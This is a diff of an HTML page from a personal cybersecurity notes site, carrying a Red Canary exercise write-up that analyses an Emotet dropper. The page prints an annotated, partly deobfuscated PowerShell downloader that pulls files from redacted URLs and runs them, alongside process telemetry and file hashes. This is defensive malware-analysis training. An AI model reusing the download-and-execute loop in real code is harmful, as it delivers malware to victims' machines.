@@ -3,27 +3,31 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Scenario #5 Analysis · Will Seligman</title>
-<link rel="stylesheet" href="/assets/style.css">
+<meta name="color-scheme" content="dark">
+<title>Scenario #5 Analysis · the-grizzly-bear</title>
+<meta name="description" content="Scenario #5 Analysis — Cybersecurity Notes &amp; CTF Writeups">
+<link rel="stylesheet" href="../../../assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
 </head>
 <body>
-<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
 <div class="layout">
 <aside class="sidebar" id="sidebar">
-  <a class="brand" href="/index.html">
+  <a class="brand" href="../../../index.html">
     <span class="brand-flag">&#127988;</span>
-    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
   </a>
-  <nav class="nav" id="nav-root" data-current="other/exercises/red-canary/scenario-5-analysis.html"></nav>
+  <nav class="nav" id="nav-root" data-current="other/exercises/red-canary/scenario-5-analysis.html" data-root="../../.."></nav>
 </aside>
 <main class="content">
   <article class="doc">
-  <div class="breadcrumb"><a href="/other/index.html">Other</a> &rsaquo; <a href="/other/exercises.html">Exercises</a> &rsaquo; <a href="/other/exercises/red-canary.html">Red Canary</a></div>
-  <h1 id="scenario-5-analysis">Scenario #5 Analysis</h1>
+  <div class="breadcrumb"><a href="../../../index.html">the-grizzly-bear</a> &rsaquo; <a href="../../index.html">Other</a> &rsaquo; <a href="../index.html">Exercises</a> &rsaquo; <a href="index.html">Red Canary</a></div>
+<h1 id="title">Scenario #5 Analysis</h1>
+
 <p>A script is base64 encoded twice</p>
-<p><span class="img-missing">image unavailable</span></p>
+<p class="figure"><a class="img-link" href="scenario-5-analysis/image.png"><img src="scenario-5-analysis/image.png" alt="image.png" loading="lazy"></a></p>
 <p>Cleaned up the remaining obfuscated script for readability</p>
-<p><span class="img-missing">image unavailable</span></p>
+<p class="figure"><a class="img-link" href="scenario-5-analysis/image-1.png"><img src="scenario-5-analysis/image-1.png" alt="image.png" loading="lazy"></a></p>
 <p>Analysis comments along the script</p>
 <pre><code class="language-powershell">#Executing encoded powershell script
 powershell -encod
@@ -58,22 +62,21 @@ $Qt9bweq=('hxxp://&lt;redacted&gt;.com/wp-admin/Sbp/*hxxp://&lt;redacted&gt;.com
 $L535zme=Ds3ue3p;
 
 foreach($E13jews in $Qt9bweq)
-    {try{$Aclzb76.“dOWnLoAdFiLe”($E13jews, $Hwzq8x1);
-    $Lemfvf4=Pqmkx0g
-    If ((Get-Item $Hwzq8x1).“length” -ge 32074) {
-        &amp;Invoke-Item $Hwzq8x1
-        $Pee0zvq=Gf4qkts
-        break
-    $M57lgwk=Sija5fg
-    } catch{}
+	{try{$Aclzb76.“dOWnLoAdFiLe”($E13jews, $Hwzq8x1);
+	$Lemfvf4=Pqmkx0g
+	If ((Get-Item $Hwzq8x1).“length” -ge 32074) {
+		&amp;Invoke-Item $Hwzq8x1
+		$Pee0zvq=Gf4qkts
+		break
+	$M57lgwk=Sija5fg
+	} catch{}
 }
 
 #Final variable
 $E6sxkf2=X3la_wl
-
 </code></pre>
 <p>With the further context of the activity</p>
-<pre><code class="language-text">
+<pre><code>
 #Microsoft Word opening a specific documented located in the outlook cache, likely through email as an attachment
 Peer Process: c:\program files\microsoft office\office16\winword.exe
 
@@ -84,23 +87,17 @@ Peer MD5: 5f48187825409cbbf797617a991ce4a4
 Peer Process CLI:
 C:\Program Files\Microsoft Office\Office16\WINWORD.EXE” /n “C:\Users\UserName\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\KW7Y6LC1\Untitled-20201014-H470846.doc” /o “
 
-
-
-
 #WMI possibly being missused, normal system management tasks, not word processing
 Parent Process: c:\windows\system32\wbem\wmiprvse.exe
 
 #https://www.virustotal.com/gui/file/a75c85f3b089993e9c042fb82ecb7757e8f460ed8065fc7991caa38a6de0f50c
 Parent MD5: 801e8003c257c8f540b20f1e0decd3a6
 
-
-
 #Powershell process executing the obfuscated script
 Process: c:\windows\system32\windowspowershell\v1.0\powershell.exe
 
 #https://www.virustotal.com/gui/file/908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53
 Process MD5: cda48fc75952ad12d99e526d0b6bf70a
-
 
 #Powershell downloaded the file and save or wrote to this exe
 Process CLI: powershell -encod ~ the script above ~
@@ -109,16 +106,14 @@ Process File Write: c:\users\UserName\b20dyak\ovpqho4\v9ofyxp.exe
 #https://www.virustotal.com/gui/file/a4048f7d23b2860f1a26171bf257872cfb03e68100f560a109cffc1ea989fb71 Flagged as Emotet
 File MD5: 7ee4feeded88cb104448141ef375be8c
 
-
 #File written once durreing process, 1 network connection, likely to download from 1 of the obfuscated urls
 File modification count: 1
-Network connection count: 1
-</code></pre>
+Network connection count: 1</code></pre>
   </article>
-  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
 </main>
 </div>
-<script src="/assets/nav.js" defer></script>
+<script src="../../../assets/nav.js" defer></script>
 <script>
 document.getElementById('menu-toggle').addEventListener('click',function(){
   document.getElementById('sidebar').classList.toggle('open');
